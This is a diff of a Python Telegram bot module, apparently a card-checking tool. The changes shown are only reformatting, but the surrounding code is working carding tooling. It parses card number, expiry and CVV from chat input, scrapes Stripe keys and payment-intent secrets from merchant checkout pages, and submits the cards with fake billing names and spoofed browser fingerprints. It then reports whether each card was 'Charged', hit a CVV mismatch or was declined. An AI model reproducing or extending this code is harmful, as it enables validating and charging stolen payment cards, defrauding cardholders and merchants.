@@ -5,7 +5,7 @@ import requests
 from requests import Session, get, patch, post
 
 from ._handler import newMsg
-from ._helpers import get_text_content, get_mention
+from ._helpers import get_mention, get_text_content
 
 B3_MESSAGE = """
 **B3/Auth $**
@@ -26,8 +26,7 @@ async def _stripe(e):
     message = await e.reply("`Processing...`")
     cc, exp_mo, exp_year, cvv = arg.split("|", 3)
     start_time = datetime.now()
-    token = tokenize_card(cc.strip(), cvv.strip(),
-                          exp_mo.strip(), exp_year.strip())
+    token = tokenize_card(cc.strip(), cvv.strip(), exp_mo.strip(), exp_year.strip())
     if token is None:
         await message.edit("`Invalid card details.`")
         return
@@ -484,11 +483,9 @@ def stripe_charge_gate(card_number, cvv, exp_month, exp_year):
     try:
         resp = client.get(req.url).text
         pk_key = (
-            re.search("var stripe = (.*)",
-                      resp).group(1).split("(")[1].split(")")[0]
+            re.search("var stripe = (.*)", resp).group(1).split("(")[1].split(")")[0]
         )
-        pi_key = re.search(
-            "stripe.confirmCardPayment\('(.*)'\,", resp).group(1)
+        pi_key = re.search("stripe.confirmCardPayment\('(.*)'\,", resp).group(1)
     except:
         return "", ""
 
@@ -497,8 +494,7 @@ def stripe_charge_gate(card_number, cvv, exp_month, exp_year):
     data = f"payment_method_data[type]=card&payment_method_data[billing_details][name]=rose&payment_method_data[billing_details][email]=roseloverx%40proton.me&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]=3a86e6fb-a4ad-45e5-b84d-753c14aeca051abe6d&payment_method_data[muid]=cc79fe27-9b43-442c-a8a0-2d99ed7ac3a676a978&payment_method_data[sid]=891e1a39-908f-417d-8be3-46e557d48ad9c0b4ee&payment_method_data[payment_user_agent]=stripe.js%2Fe5a12ae7c%3B+stripe-js-v3%2Fe5a12ae7c&payment_method_data[time_on_page]=69370&expected_payment_method_type=card&use_stripe_sdk=true&key={pk_key}&client_secret={pi_key}"
 
     response = post(
-        "https://api.stripe.com/v1/payment_intents/{}/confirm".format(
-            payment_intent),
+        "https://api.stripe.com/v1/payment_intents/{}/confirm".format(payment_intent),
         headers={
             "content-type": "application/x-www-form-urlencoded",
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
@@ -526,8 +522,7 @@ def voucher_pub(card_number, cvv, exp_mo, exp_year):
     }
     data = f"type=card&owner[name]=Jenna++Oretega&owner[address][line1]=431&owner[address][state]=CA&owner[address][city]=Kozhikode&owner[address][postal_code]=10800&owner[address][country]=US&owner[email]=roseloverx%40proton.me&card[number]={card_number}&card[cvc]={cvv}&card[exp_month]={exp_mo}&card[exp_year]={exp_year}&guid=2502e27c-c4db-4af8-a601-f1d6983af82ef33d6c&muid=2cb9fdb4-d524-45a3-9b0b-ce2578e22030103b84&sid=080260f5-7cbe-4bf4-9f47-b0da61ed0ff40e6908&payment_user_agent=stripe.js%2F70a10e913%3B+stripe-js-v3%2F70a10e913&time_on_page=274979&key=pk_live_5GH8TRC8LDfgJHq9JYiER8SI00rjxbhapi"
 
-    response = post("https://api.stripe.com/v1/sources",
-                    headers=headers, data=data)
+    response = post("https://api.stripe.com/v1/sources", headers=headers, data=data)
     stripe_source = response.json()["id"]
     params = {
         "wc-ajax": "checkout",
@@ -572,13 +567,23 @@ def voucher_pub(card_number, cvv, exp_mo, exp_year):
         headers=headers,
     )
     if response.json().get("next_action") is not None:
-        return "3D Secure", "3ds_vbv", "Your card requires additional authentication", "❌"
+        return (
+            "3D Secure",
+            "3ds_vbv",
+            "Your card requires additional authentication",
+            "❌",
+        )
     elif response.json().get("last_payment_error") is not None:
         print(response.json())
         last_payment = response.json()["last_payment_error"]
         if "card's security code is incorrect" in last_payment.get("message", ""):
             return "CCN", "incorrect_cvv", last_payment.get("message"), "✅"
-        return "Declined", last_payment.get("decline_code", "-"), last_payment.get("message", "-"), "❌"
+        return (
+            "Declined",
+            last_payment.get("decline_code", "-"),
+            last_payment.get("message", "-"),
+            "❌",
+        )
     else:
         print(response.json())
         return "Charged", "-", "Voucher has been sent to your email", "✅"
